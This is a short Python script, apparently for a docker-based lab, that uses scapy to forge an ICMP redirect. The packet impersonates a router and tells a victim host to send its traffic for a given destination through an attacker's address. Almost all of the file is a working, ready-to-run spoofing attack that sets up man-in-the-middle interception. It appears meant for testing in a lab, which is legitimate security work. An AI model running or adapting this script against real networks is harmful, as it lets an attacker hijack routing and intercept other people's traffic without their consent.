#!/usr/bin/env python3
"""
Simple ICMP Redirect Attack Test
This simplified version sends a single ICMP redirect to test the attack.
"""

from scapy.all import *
import time

def send_icmp_redirect():
    """Send a single ICMP redirect message"""
    
    # Configuration
    victim_ip = "192.168.1.10"
    router_ip = "192.168.1.1"
    attacker_ip = "192.168.1.20"
    external_target = "10.0.0.100"
    
    print(f"[*] Sending ICMP redirect attack...")
    print(f"[*] Victim: {victim_ip}")
    print(f"[*] Impersonating router: {router_ip}")
    print(f"[*] Redirecting to attacker: {attacker_ip}")
    print(f"[*] For destination: {external_target}")
    
    # Create a fake original packet (what victim would send)
    original_packet = IP(src=victim_ip, dst=external_target) / ICMP()
    
    # Create ICMP redirect packet
    # Type 5 = Redirect, Code 1 = Redirect for Host
    icmp_redirect = IP(src=router_ip, dst=victim_ip) / \
                   ICMP(type=5, code=1, gw=attacker_ip) / \
                   original_packet
    
    # Send the redirect packet
    send(icmp_redirect, verbose=True)
    
    print(f"[*] ICMP redirect sent!")
    print(f"[*] Told victim {victim_ip} to use {attacker_ip} as gateway for {external_target}")

if __name__ == "__main__":
    print("Simple ICMP Redirect Attack Test")
    print("================================")
    send_icmp_redirect()
    print("\n[*] Test complete. Check victim's routing table with:")
    print("    docker exec victim ip route show")
    print("    docker exec victim arp -a")
